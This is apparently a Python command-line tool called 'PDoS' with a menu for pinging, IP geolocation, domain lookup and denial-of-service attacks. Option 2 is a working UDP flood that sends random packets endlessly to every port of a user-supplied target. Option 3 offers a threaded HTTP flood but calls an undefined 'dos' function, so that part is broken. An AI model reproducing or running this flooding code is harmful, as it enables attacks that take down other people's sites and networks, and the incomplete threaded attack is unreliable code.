import socket
import os
import random
import time
import threading
from time import sleep
from os import system
import requests
import socket



B = '\033[35m'
R = '\033[31m'
N = '\033[0m'
A = '\033[34m'
      
def get_ipv4_address():
    try:
        hostname = socket.gethostname()
        ipv4_address = socket.gethostbyname(hostname)
        return ipv4_address
    except:
        return "Not found"

def get_ipv6_address():
    try:
        ipv6_address = requests.get('https://api6.ipify.org').text
        return ipv6_address
    except:
        return "Not found"

def get_public_ip():
    try:
        public_ip = requests.get('https://api.ipify.org').text
        return public_ip
    except:
        return "Not found"
    

os.system("cls")

def main():
    white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(3500)
    system("cls")

    
    print(R + "> https://github.com/P1shi/PDoS \n")
    print( R + "            ▄███████▄ ████████▄   ▄██████▄     ▄████████ ")
    print( R + "           ███    ███ ███   ▀███ ███    ███   ███    ███ ")
    print( R + "           ███    ███ ███    ███ ███    ███   ███    █▀  ")
    print( R + "           ███    ███ ███    ███ ███    ███   ███        ")
    print( R + "         ▀█████████▀  ███    ███ ███    ███ ▀███████████ ")
    print( R + "           ███        ███    ███ ███    ███          ███ ")
    print( R + "           ███        ███   ▄███ ███    ███    ▄█    ███ ")
    print( R + "          ▄████▀      ████████▀   ▀██████▀   ▄████████▀   \n ")
    print()
    print("                          Select Menu :")
    print("\033[31m╭—————————————————————————————————————————————————————————————╮\033[0m")
    print(R + "| 1 — Ping an ip                                              |")  
    print(R + "| 2 — DDoS a Site or IP                                       |  ")  
    print(R + "| 3 — DDoS a Site (V2)                                        | ")  
    print(R + "| 4 — Get some infos about an IP address                      |  ")   
    print(R + "| 5 — Get your current IP address                             |  ") 
    print(R + "| 6 — Find the host IP address of a site                      |  ")
    print(R + "| 7 — Exit                                                    |  ")                                     
    print(R + "\033[31m╰—————————————————————————————————————————————————————————————╯\033[0m")
    print()

    Choice = input(R + "[" + B + "#" + R + "] " + R + "Enter your choice : ")

    if Choice == "1":
        def check_internet():
            try:
                socket.create_connection(("www.google.com", 80))
                return True
            except OSError:
                return False
            
        ipA = input(R + "[" + B + "+" + R + "] " + R + "Target's IP : ")
        print(B + B + "[" + A + "$" + B + "] " + B + "Pinging...")
        sleep(2)

        if not check_internet():
                print(R + "[" + B + "!" + R + "] " + R + "Please check your internet connection")
                sleep(3)
                main()

        pingip = "ping -t -w 1000 " + "" + ipA
        system("cls")
        system("color 4")
        system(pingip)
        sleep(100)
        




    elif Choice == "2":
        ip = input(R + "[" + B + "+" + R + "] " + R + "Target's IP or Website Domain : ")
        print(B + B + "[" + A + "$" + B + "] " + B + "Attack starting...")
        time.sleep(3)
        sent = 0

        while True: 
            for port in range(1, 65534):
                try:
                    white.sendto(bytes, (ip, port))
                    sent = sent + 1
                    print("\033[1;35mSend \033[1;31m%s \033[1;35m Packets to \033[1;31m%s \033[1;35mThrough port \033[1;31m%s " % (sent, ip, port))
                except socket.gaierror:
                    print(R + R + "[" + B + "!" + R + "] " + R + "can not find the ip address")
                    time.sleep(3)
                    os.system("cls")
                    main()
                    return
                
    

    elif Choice == "3":
        def check_internet():
            try:
                socket.create_connection(("www.google.com", 80))
                return True
            except OSError:
                return False
 
        threads = 20

        

        url = input(R + "[" + B + "+" + R + "] " + "Target's Website URL : ")

        
        
        if not check_internet():
                print(R + "[" + B + "!" + R + "] " + R + "Please check your internet connection")
                sleep(3)
                main()
        
 
        try:
            threads = int(input(R + "[" + B + "+" + R + "] " + "Threads : "))
            print(B + B + "[" + A + "$" + B + "] " + B + "Attack starting...")
            sleep(4)
        except ValueError:
            print(R + "[" + B + "!" + R + "] " + "Threads count is incorrect")
            time.sleep(3)
            main()
 
        if threads == 0:
            print(R + "[" + B + "!" + R + "] " + "Threads count is incorrect")
            time.sleep(3)
            main()
            
        if not url.__contains__("http"):
            print(R + "[" + B + "!" + R + "] " + "URL doesnt contains http or https")
            sleep(3)
            main()

        if not url.__contains__("."):
            print(R + "[" + B + "!" + R + "] " + "Invalid domain")
            sleep(3)
            main()
 
        for i in range(0, threads):
            thr = threading.Thread(target=dos, args=(url,))
            thr.start()
            print(B + B + "[" + A + "$" + B + "] " + B +  str(i + 1) + " threads started")
    
    elif Choice == "4":
        def check_internet():
            try:
                socket.create_connection(("www.google.com", 80))
                return True
            except OSError:
                return False

        def get_ip_info():
            ip_address = input(R + "[" + B + "+" + R + "] " + R + "Enter the IP address : ")
            print(B + B + "[" + A + "$" + B + "] " + B + "Getting some info...")
            sleep(2)

            if not check_internet():
                print(R + "[" + B + "!" + R + "] " + R + "Please check your internet connection")
                sleep(3)
                main()

            response = requests.get(f"http://ip-api.com/json/{ip_address}")

            if response.status_code != 200:
                print(R + "[" + B + "!" + R + "] " + R + "Cannot find the ip address")
                sleep(3)
                main()

            data = response.json()

            print(B + "\n╭ " + R + "IP ADDRESS : " + ip_address)
            print(B + "├ " + R + "STATE : ", data.get('regionName', 'N/A'))
            print(B + "├ " + R + "ORGANIZATION : ", data.get('org', 'N/A'))
            print(B + "├ " + R + "ISP : ", data.get('isp', 'N/A'))
            print(B + "├ " + R + "CITY : ", data.get('city', 'N/A'))
            print(B + "├ " + R + "COUNTRY : ", data.get('country', 'N/A'))
            print(B + "├ " + R + "COUNTRY ISO : ", data.get('countryCode', 'N/A'))
            print(B + "├ " + R + "POSTAL CODE : ", data.get('zip', 'N/A'))
            print(B + "├ " + R + "LATITUDE : ", data.get('lat', 'N/A'))
            print(B + "├ " + R + "LONGITUDE : ", data.get('lon', 'N/A'))

            if 'lat' in data and 'lon' in data:
                print(B + "╰ " + R + "LOCATION : ", f"https://www.google.com/maps/?q={data['lat']},{data['lon']}")
                
            main_menu = input("\nWanna go back to the main menu (Y/N) ? ")

            if main_menu == "Y":
                print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
                sleep(2)
                main()

            elif main_menu == "N":
                sleep(2)
                exit()

            elif main_menu == "y":
                print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
                sleep(2)
                main()

            elif main_menu == "n":
                sleep(2)
                exit()
            
            else :
                sleep(2)
                exit()

        get_ip_info()


    elif Choice == "5":
        print()
        print(B + "╭ " + R + "IPv4 Address : ", get_ipv4_address())
        print(B + "├ " + R + "IPv6 Address : ", get_ipv6_address())
        print(B + "╰ " + R + "Public IP Address : ", get_public_ip())

        main_menu2 = input("\nWanna go back to the main menu (Y/N) ? ")

        if main_menu2 == "Y":
            print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
            sleep(2)
            main()

        elif main_menu2 == "N":
            sleep(2)
            exit()

        elif main_menu2 == "y":
            print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
            sleep(2)
            main()

        elif main_menu2 == "n":
            sleep(2)
            exit()
            
        else :
            sleep(2)
            exit()

         
    elif Choice == "6":
        def check_internet():
            try:
                socket.create_connection(("www.google.com", 80))
                return True
            except OSError:
                return False
        
        def get_ip_address(domain):
            try:
                ip_address = socket.gethostbyname(domain)
                return ip_address
            except socket.gaierror:
                return None


        domain = input(R + "[" + B + "+" + R + "] " + "Enter the site Domain : ")
        print(B + "[" + A + "$" + B + "] " + "Finding the IP address...")
        sleep(2)

        if not check_internet():
                print(R + "[" + B + "!" + R + "] " + R + "Please check your internet connection")
                sleep(3)
                main()
        ip = get_ip_address(domain)

        if ip:
            print()
            print(B + "╭ " + R + "Site Domain : " + B +  domain)
            print(B + "|")
            print(B + "╰ " + R + f"The IP address of " + B + domain + R + " is " + B + ip)

            main_menu3 = input(R + "\nWanna go back to the main menu (Y/N) ? ")

            if main_menu3 == "Y":
                print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
                sleep(2)
                main()

            elif main_menu3 == "N":
                sleep(2)
                exit()

            elif main_menu3 == "y":
                print(B + B + "[" + A + "$" + B + "] " + B + "Transferring to the main menu...")
                sleep(2)
                main()

            elif main_menu3 == "n":
                sleep(2)
                exit()
            
            else :
                sleep(2)
                exit()

        else:
            print(R + "[" + B + "!" + R + "] " + R + f"Could not resolve the IP address of {domain}")
            sleep(4)
            main()

    
    elif Choice == "7":
        print( B + "[" + A + "$" + B + "] Exiting...")
        sleep(2)
        exit()


    else:
       print(R + "[" + B + "!" + R + "] " + R + "invailed choice")
       sleep(3)
       main()

if __name__ == "__main__":
    main()